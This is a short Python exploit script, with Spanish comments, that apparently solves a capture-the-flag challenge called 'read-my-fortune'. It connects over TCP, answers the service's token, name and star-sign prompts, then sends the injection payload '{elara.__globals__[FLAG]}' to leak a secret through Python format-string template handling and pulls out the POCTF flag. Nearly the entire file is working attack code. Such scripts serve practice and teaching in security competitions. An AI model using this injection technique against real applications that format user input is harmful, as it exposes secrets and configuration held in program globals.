import sys
import socket
import time

HOST = "read-my-fortune.pointeroverflowctf.com"
PORT = 9000

EXPLOIT_PAYLOAD = "{elara.__globals__[FLAG]}"

def receive_until(sock, prompt):
    """Lee del socket TCP crudo hasta encontrar la cadena o prompt esperado."""
    data = b""
    while prompt.encode() not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data.decode(errors='ignore')

def main():
    if len(sys.argv) != 2:
        print("Uso: python3 exploit_read_me_my_fortune.py <TOKEN_DE_SESION_DEL_EQUIPO>")
        print("El token se obtiene de la página del challenge y expira en 15 minutos.")
        sys.exit(1)

    team_token = sys.argv[1]

    print(f"[+] Conectando a {HOST}:{PORT}...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(15)
            s.connect((HOST, PORT))
            
            print("[+] Esperando prompt de token...")
            receive_until(s, "Token: ")
            
            print(f"[+] Enviando token: {team_token}")
            s.sendall(f"{team_token}\n".encode())
            
            print("[+] Esperando prompt de nombre...")
            receive_until(s, "What is your name? ")
            s.sendall(b"Melina\n")
            
            print("[+] Esperando prompt de signo...")
            receive_until(s, "What is your star sign? ")
            s.sendall(b"Gemini\n")
            
            print("[+] Esperando prompt de template...")
            receive_until(s, "Template: ")
            
            print(f"[+] Enviando payload SSTI: {EXPLOIT_PAYLOAD}")
            s.sendall(f"{EXPLOIT_PAYLOAD}\n".encode())
            
            print("[+] Leyendo respuesta del oráculo...")
            time.sleep(1) # Pequeña pausa para asegurar que llega toda la respuesta
            response = s.recv(4096).decode(errors='ignore')
            
            print("\n[+] Respuesta del servidor:")
            print(response.strip())
            
            if "POCTF{" in response:
                flag_start = response.find("POCTF{")
                flag_end = response.find("}", flag_start) + 1
                flag = response[flag_start:flag_end]
                print(f"\n[+] ¡Explotación exitosa! Flag extraída: {flag}")
            else:
                print("\n[-] No se pudo aislar la flag en la respuesta.")
                
    except Exception as e:
        print(f"[-] Ocurrió un error de red: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
